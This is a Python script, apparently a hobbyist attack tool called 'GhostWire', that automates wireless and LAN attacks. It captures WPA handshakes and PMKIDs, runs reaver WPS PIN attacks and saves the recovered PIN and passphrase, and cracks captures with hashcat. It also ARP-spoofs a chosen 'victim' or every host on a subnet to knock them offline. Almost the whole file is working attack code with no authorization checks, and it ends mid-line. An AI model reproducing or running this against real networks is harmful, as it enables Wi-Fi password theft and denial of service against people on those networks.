#!/usr/bin/env python3
"""
GhostWire – created by Null_Lyfe
Comprehensive wireless-auditing and LAN-control toolkit.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import logging
import os
import random
import shutil
import signal
import sys
import time
from pathlib import Path
from subprocess import CalledProcessError, DEVNULL, PIPE, run
from threading import Event, Thread
from typing import Iterable, Sequence

try:
    from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, srp
except ImportError:
    print("✘ Scapy required (`pip install scapy`).")
    sys.exit(1)

# ── Style ──────────────────────────────────────────────────────────
NEON_PURPLE = "\033[95m"
NEON_CYAN   = "\033[96m"
NEON_GREEN  = "\033[92m"
NEON_RED    = "\033[91m"
BOLD        = "\033[1m"
RESET       = "\033[0m"
SPINNER_FRAMES = "▁▂▃▄▅▆▇█▇▆▅▄▃▁"
_QUOTES = [
    "“Obscurity isn’t security; vigilance is.”",
    "“The quieter you become, the more you hear.”",
    "“Trust, but verify—always.”",
    "“In security, the last mile is all that matters.”",
    "“Attackers automate; defenders must orchestrate.”",
]

# ── Globals ────────────────────────────────────────────────────────
LOG_DIR = Path("ghostwire_logs")
LOG_DIR.mkdir(exist_ok=True)
logging.basicConfig(
    filename=LOG_DIR / "ghostwire.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
)
stop_spinner = Event()

# ── Helpers ────────────────────────────────────────────────────────
def neon(msg: str, color: str = NEON_CYAN) -> str:
    return f"{BOLD}{color}{msg}{RESET}"

def banner() -> None:
    lines = ["GhostWire", "created by Null_Lyfe", random.choice(_QUOTES)]
    w = max(map(len, lines)) + 4
    print(neon("┌" + "─" * w + "┐", NEON_PURPLE))
    for l in lines:
        print(neon(f"│  {l.ljust(w - 2)}│", NEON_PURPLE))
    print(neon("└" + "─" * w + "┘\n", NEON_PURPLE))

def require_root() -> None:
    if os.geteuid() != 0:
        print(neon("✘ Root privileges required.", NEON_RED))
        sys.exit(1)

def check_deps(bins: Iterable[str]) -> None:
    miss = [b for b in bins if shutil.which(b) is None]
    if miss:
        print(neon("✘ Missing tools: " + ", ".join(miss), NEON_RED))
        sys.exit(1)

def run_cmd(cmd: Sequence[str], *, capture=False) -> str | None:
    logging.info("RUN %s", " ".join(cmd))
    try:
        res = run(cmd, check=True,
                  stdout=PIPE if capture else DEVNULL,
                  stderr=PIPE, text=True)
        return res.stdout if capture else None
    except FileNotFoundError:
        print(neon(f"✘ {cmd[0]} not found", NEON_RED)); sys.exit(1)
    except CalledProcessError as e:
        print(neon(f"✘ Failed: {' '.join(cmd)}", NEON_RED))
        logging.error("stderr: %s", e.stderr); sys.exit(1)

def spinner(prompt: str) -> Thread:
    def _spin() -> None:
        i = 0
        while not stop_spinner.is_set():
            print(f"\r{neon(prompt, NEON_PURPLE)} {SPINNER_FRAMES[i % len(SPINNER_FRAMES)]}",
                  end="", flush=True)
            i += 1; time.sleep(0.07)
        print("\r", end="", flush=True)
    t = Thread(target=_spin, daemon=True); t.start(); return t

# ── Monitor mode ────────────────────────────────────────────────────
def enable_monitor(iface: str) -> str:
    run_cmd(["airmon-ng", "start", iface])
    return iface if iface.endswith("mon") else iface + "mon"

def disable_monitor(iface: str) -> None:
    if iface.endswith("mon"):
        run_cmd(["airmon-ng", "stop", iface])

# ── Wi-Fi actions ───────────────────────────────────────────────────
def wifi_scan(iface: str) -> None:
    run_cmd(["airodump-ng", iface])

def capture_handshake(iface, bssid, channel, wordlist=None):
    spin = spinner("Capturing handshake")
    run_cmd(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", iface])
    stop_spinner.set(); spin.join(); stop_spinner.clear()
    if wordlist: auto_crack("handshake-01.cap", wordlist)

def pmkid_capture(iface, wordlist=None):
    run_cmd(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng"])
    if wordlist: auto_crack("pmkid.pcapng", wordlist)

def wps_attack(iface, bssid, channel):
    out = run_cmd(["reaver", "-i", iface, "-b", bssid, "-c", channel, "-vv"], capture=True)
    pin = psk = None
    for line in out.splitlines():
        if "WPS PIN:" in line: pin = line.split(":")[-1].strip()
        if "PSK:" in line:     psk = line.split(":")[-1].strip()
    (LOG_DIR / "wps_creds.json").write_text(json.dumps(
        {"bssid": bssid, "pin": pin, "psk": psk}, indent=2))
    print(neon("✔ WPS creds stored", NEON_GREEN))

# ── Hashcat helpers ────────────────────────────────────────────────
def convert_to_22000(capture: str) -> Path:
    out = Path(capture).with_suffix(".22000")
    run_cmd(["hcxpcapngtool", "-o", str(out), capture]); return out

def crack_hash(hashfile: Path, wordlist: str) -> None:
    spin = spinner("Hashcat cracking")
    run_cmd(["hashcat", "-m", "22000", "-a", "0", str(hashfile), wordlist,
             "--force", "--status", "--status-timer=30"])
    stop_spinner.set(); spin.join(); stop_spinner.clear()
    out = run_cmd(["hashcat", "-m", "22000", "-a", "0", str(hashfile),
                   wordlist, "--show"], capture=True)
    if out.strip():
        print(neon(f"✔ Password → {out.strip().split(':')[-1]}", NEON_GREEN))
    else:
        print(neon("✘ No key recovered", NEON_RED))

def auto_crack(capture: str, wordlist: str) -> None:
    crack_hash(convert_to_22000(capture), wordlist)

# ── LAN actions ─────────────────────────────────────────────────────
def lan_scan(subnet: str):
    net = ipaddress.ip_network(subnet, strict=False)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(net)),
                 timeout=2, verbose=0)
    for _, r in ans:
        print(neon(f"{r.psrc:<15} {r.hwsrc}", NEON_GREEN))
    return [(r.psrc, r.hwsrc) for _, r in ans]

def _arp_spoof(dst_ip, dst_mac, src_ip, iface):
    pkt = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip)
    while not stop_spinner.is_set():
        send(pkt, iface=iface, verbose=0); time.sleep(2)

def kick(ip, gw, iface):
    conf.iface = iface
    vm = next((m for i, m in lan_scan(f"{ip}/32") if i == ip), None)
    if not vm: print(neon("✘ Victim not found", NEON_RED)); return
    stop_spinner.clear()
    t = Thread(target=_arp_spoof, args=(ip, vm, gw, iface), daemon=True); t.start()
    print(neon("⇢ Ctrl-C to stop", NEON_PURPLE))
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_spinner.set(); t.join(); print(neon("✔ Released victim", NEON_GREEN))

def kickall(subnet, gw, iface):
    conf.iface = iface
    trg = [ip for ip, _ in lan_scan(subnet) if ip != gw]
    for ip in trg:
        send(ARP(op=2, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gw),
             iface=iface, verbose=0)
    print(neon(f"✔ Deauth sent to {len(trg)} hosts", NEON_GREEN))

# ── Interactive UI ─────────────────────────────────────────────────
def menu():
    print(neon("1) Wi-Fi Scan / Attack", NEON_CYAN))
    print(neon("2) LAN Scan",           NEON_CYAN))
    print(neon("3) Kick Device",        NEON_CYAN))
    print(neon("4) Kick ALL Devices",   NEON_CYAN))
    print(neon("5) Crack WPA Capture",  NEON_CYAN))
    print(neon("0) Exit",               NEON_CYAN))

def interactive():
    while True:
        menu(); choice = input(neon("› ", NEON_GREEN)).strip()
        if choice == "1":
            iface = input("Interface > "); mon = enable_monitor(iface)
            try: wifi_scan(mon)
            finally: disable_monitor(mon)
        elif choice == "2":
            lan_scan(input("Subnet (e.g. 192.168.1.0/24) > "))
        elif choice == "3":
            kick(input("Victim IP > "), input("Gateway IP > "), input("Interface > "))
        elif choice == "4":
            kickall(input("Subnet > "), input("Gateway IP > "), input("Interface > "))
        elif choice == "5":
            auto_crack(input("Capture file > "), input("Wordlist path > "))
        elif choice == "0": break
        else: print(neon("Invalid choice", NEON_RED))

# ── CLI parsing ────────────────────────────────────────────────────
def build_cli() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="GhostWire CLI")
    sub = p.add_subparsers(dest="cmd")

    wifi = sub.add_parser("wifi", help="Wireless operations")
    wifi.add_argument("action", choices=["scan", "handshake", "pmkid", "wps"])
    wifi.add_argument("-i", "--iface", required=True)
    wifi.add_argument("--bssid"); wifi.add_argument("--channel")
    wifi.add_argument("--wordlist")

    lan = sub.add_parser("lan", help="LAN operations")
    lan.add_argument("action", choices=["scan", "kick", "kickall"])
    lan.add_argument("subnet_or_ip"); lan.add_argument("--gateway"); lan.add_argument("-i", "--iface")

    crack = sub.add_parser("crack", help="Crack WPA capture")
    crack.add_argument("capture"); crack.add_argument("wordlist")
    return p

# ── Main ──────────────────────────────────────────────────────────
def main():
    require_root(); banner()
    check_deps(["airmon-ng","airodump-ng","hcxdumptool","hcxpcapngtool","hashcat","reaver","nmap"])
    args = build_cli().parse_args()
    if args.cmd is None: interactive(); return
    if args.cmd == "wifi":
        mon = enable_monitor(args.iface)
        try:
            if args.action == "scan": wifi_scan(mon)
            elif args.action == "handshake":
                if not (args.bssid and args.channel):
                    sys.exit("handshake needs --bssid & --channel")
                capture_handshake(mon, args.bssid, args.channel, args.wordlist)
            elif args.action == "pmkid":
                pmkid_capture(mon, args.wordlist)
            elif args.action == "wps":
                if not (args.bssid and args.channel):
                    sys.exit("wps needs --bssid & --channel")
                wps_attack(mon, args.bssid, args.channel)
        finally: disable_monitor(mon)
    elif args.cmd == "lan":
        if args.action == "scan": lan_scan(args.subnet_or_ip)
        elif args.action == "kick":
            if not (args.gateway and args.iface):
                sys.exit("kick needs --gateway & --iface")
            kick(args.subnet_or_ip, args.gateway, args.iface)
        elif args.action == "kickall":
            if not (args.gateway and args.iface):
                sys